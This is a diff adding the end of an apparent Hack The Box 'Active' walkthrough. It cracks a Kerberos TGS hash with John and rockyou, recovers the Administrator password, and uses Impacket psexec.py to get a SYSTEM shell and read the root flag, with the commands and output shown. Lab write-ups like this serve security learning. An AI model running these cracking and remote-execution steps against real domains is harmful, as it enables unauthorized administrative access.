@@ -207,3 +207,44 @@ https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
 // We can see the hash starts with 'krb5tgs'
 
+// [john](https://github.com/openwall/john) have this format, Lets decrypt that hash
+
+    $ john --format=krb5tgs --wordlist=/home/r4r3/Desktop/HTB/wordlists--/rockyou.txt TGSs.out 
+---------
+
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+    Will run 4 OpenMP threads
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    Ticketmaster1968 (?)
+    1g 0:00:00:11 DONE (2021-08-22 00:30) 0.09000g/s 948513p/s 948513c/s 948513C/s Tiffani1432..Thrash1
+    Use the "--show" option to display all of the cracked passwords reliably
+    Session completed
+
+// We got Administrator password: Ticketmaster1968 
+
+// For a shell we can use impacket tool [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
+
+    $ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
+--------
+
+    Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+    [*] Requesting shares on 10.10.10.100.....
+    [*] Found writable share ADMIN$
+    [*] Uploading file FgXeNmIe.exe
+    [*] Opening SVCManager on 10.10.10.100.....
+    [*] Creating service Xoni on 10.10.10.100.....
+    [*] Starting service Xoni.....
+    [!] Press help for extra shell commands
+    Microsoft Windows [Version 6.1.7601]
+    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+    C:\Windows\system32>whoami
+    nt authority\system
+
+// We got shell as NT/SYSTEM !!, And root flag !
+
+    C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+
+    b5fc76d1..........
